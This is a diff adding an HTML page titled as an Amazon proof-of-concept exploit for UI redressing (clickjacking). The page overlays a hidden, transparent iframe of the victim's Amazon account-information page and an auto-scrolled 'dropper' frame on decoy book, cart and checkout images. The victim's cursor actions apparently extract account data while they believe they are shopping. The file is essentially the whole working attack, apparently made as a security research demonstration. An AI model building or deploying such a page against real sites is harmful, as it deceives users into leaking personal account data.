@@ -1,0 +1,66 @@
+<html>
+	<head>
+		<title>UI Redressing Mayhem - Amazon Proof of Concept Exploit</title>
+
+		<script>
+			
+			var extracted = false;
+			function change() {
+			
+				if(extracted == true)
+					return;
+				
+				if(document.getElementById('cart').name == '0') {
+				
+					document.getElementById('cart').name = '1';
+					document.getElementById('cart').src = '1.png';
+					document.getElementById('book').src = 'book2.png';
+					
+				} else if(document.getElementById('cart').name == '1') {
+				
+					extracted = true;				
+					document.getElementById('cart').src = '2.png';
+
+					alert('Now checkout your order!');
+					
+					// Introduce the "checkout" icon
+					document.getElementById('checkout').style.visibility = 'visible';
+				}
+			}
+			
+			function showTheMagic() {
+			
+				if(document.getElementById('bottom').style.opacity == 0)
+					document.getElementById('bottom').style.opacity = '0.3';
+				else
+					document.getElementById('bottom').style.opacity = '0.0';
+			}
+			
+		</script>
+	</head>
+
+	<body onload="document.getElementById('dropper').contentWindow.scrollTo(0,1250);">
+
+		<input type='submit' value='show me the magic' onclick='showTheMagic()'/>
+			
+		<div style='position:fixed; top:20px'>
+		
+			<div id="bottom" style="opacity:0.0;z-index:1;position:fixed;width:60%;height:100%" align='center'>
+			
+				<iframe id="info" style="position:fixed;top:23px;left:430px;" src="https://www.amazon.com/gp/css/account/info/view.html?ie=UTF8&ref_=ya_20" width="50%" height="200px" scrolling='auto'></iframe>
+
+				<iframe id="dropper" onmouseover='change()' style="position:fixed;top:280px" src="scroll.html" width="40%" height="40%"></iframe>
+
+			</div>
+				
+			<div id="top" style="opacity:1.0;z-index:-1;position:fixed;width:90%;height:100%" align='center'>
+			
+				<img style="position:fixed;top:60px;left:550px" src="book.png" id="book" width='8%'/>				
+				<br/>
+				<img style="position:fixed;top:330px" src="0.png" id="cart" name="0"/>
+				<img style="position:fixed;top:460px;left:440px;visibility:hidden;" src="checkout.png" id="checkout" width="7%" height=""/>
+				
+			</div>
+		</div>
+	</body>
+</html>
